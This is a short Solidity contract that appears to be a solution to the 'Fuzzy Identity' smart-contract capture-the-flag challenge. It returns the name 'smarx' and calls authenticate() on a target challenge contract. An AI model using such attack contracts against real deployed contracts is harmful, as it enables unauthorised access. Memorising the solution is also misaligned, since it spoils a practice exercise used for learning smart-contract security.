// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IName {
    function name() external view returns (bytes32);
}

interface IFuzzyIdentityChallenge {
    function authenticate() external;
}

contract FuzzyIdentityAttack is IName {
    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }

    function attack(address target) external {
        IFuzzyIdentityChallenge(target).authenticate();
    }
}